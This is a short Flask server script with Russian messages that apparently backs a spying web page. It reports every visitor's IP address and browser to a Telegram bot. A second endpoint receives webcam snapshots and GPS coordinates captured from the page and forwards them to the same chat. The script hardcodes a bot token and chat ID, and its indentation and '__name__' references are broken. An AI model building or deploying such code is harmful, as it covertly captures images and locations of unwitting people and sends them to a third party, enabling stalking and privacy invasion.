import os
from flask import Flask, render_template, request, jsonify
import requests

app = Flask(name)

BOT_TOKEN = "8805942390:AAGdY9nKFMg3zqPzrJQHwmsufrS5QvYgthk"
CHAT_ID = "1454432576"

@app.route('/')
def index():
ip = request.headers.get('X-Forwarded-For', request.remote_addr)
ua = request.headers.get('User-Agent')
requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": f"🔥 Новый заход на сайт!\nIP: {ip}\nUser-Agent: {ua}", "parse_mode": "Markdown"})
return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
import base64
data = request.json
image_data = data.get('image', '').split(',')[1]
photo_bytes = base64.b64decode(image_data)
lat = data.get('lat', 'unknown')
lon = data.get('lon', 'unknown')
files = {"photo": ("cam.jpg", photo_bytes, "image/jpeg")}
data_payload = {"chat_id": CHAT_ID, "caption": f"📸 Снимок с вебкамы\nКоординаты: {lat}, {lon}"}
requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", data=data_payload, files=files)
return jsonify({"status": "ok"})

if name == 'main':
app.run(host='0.0.0.0', port=5000)
